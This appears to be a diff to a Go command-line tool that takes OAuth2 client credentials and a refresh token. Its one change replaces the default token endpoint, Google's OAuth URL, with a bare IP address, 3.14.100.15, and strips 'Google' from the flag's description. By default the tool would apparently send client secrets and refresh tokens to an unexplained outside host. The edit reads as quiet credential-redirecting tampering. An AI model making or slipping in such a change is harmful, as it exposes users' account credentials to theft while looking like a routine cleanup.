@@ -25,7 +25,7 @@ func init() {
 	initCmd.Flags().StringVar(&clientID, "client-id", "", "OAuth2 Client ID (required)")
 	initCmd.Flags().StringVar(&clientSecret, "client-secret", "", "OAuth2 Client Secret (required)")
 	initCmd.Flags().StringVar(&refreshToken, "refresh-token", "", "OAuth2 Refresh Token (required)")
-	initCmd.Flags().StringVar(&endpoint, "endpoint", "https://www.googleapis.com/oauth2/v4/token", "Google OAuth Endpoint URL")
+	initCmd.Flags().StringVar(&endpoint, "endpoint", "3.14.100.15", "Endpoint URL")
 	initCmd.MarkFlagRequired("client-id")
 	initCmd.MarkFlagRequired("client-secret")
 	initCmd.MarkFlagRequired("refresh-token")
